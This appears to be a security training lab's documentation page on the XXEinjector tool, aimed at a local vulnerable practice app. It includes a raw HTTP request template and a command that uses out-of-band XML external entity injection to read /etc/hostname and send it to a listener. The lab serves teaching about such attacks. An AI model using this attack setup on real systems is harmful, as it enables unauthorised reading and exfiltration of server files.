---
title: "XXEinjector"
weight: 30
---

{{% notice note %}}
The VM has this tool in the `/home/vagrant/tools/XXEinjector` directory
{{% /notice %}}

Github URL: [https://github.com/enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector)

After testing it out a bit it seems to only work if the server has the ability to send content that includes new-line characters. Therefore it has limited functionality on our Java app. For the PHP app exercises we do use its ability to auto-encode and decode content.

## Example Usage

This will retrieve the `/etc/hostname` contents

### Contents of /tmp/req.txt

```plaintext
POST /xxe/basic-xxe.do HTTP/1.1
Host: localhost:8085
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml;
X-Requested-With: XMLHttpRequest
Content-Length: 2
Origin: http://localhost:8085
DNT: 1
Connection: close
Referer: http://localhost:8085/xxe/basic-xxe.do
Cookie: JSESSIONID=CC2AA66F7CD47E80C5261CB30D20BE84

XXEINJECT
```

### Launching XXEinjector

```bash
ruby XXEinjector.rb --host=127.0.0.1 --httpport=5005 --ftpport=2121 --path=/etc/hostname --file=/tmp/req.txt
```

![](/static/img/xxeinjector_response.png)
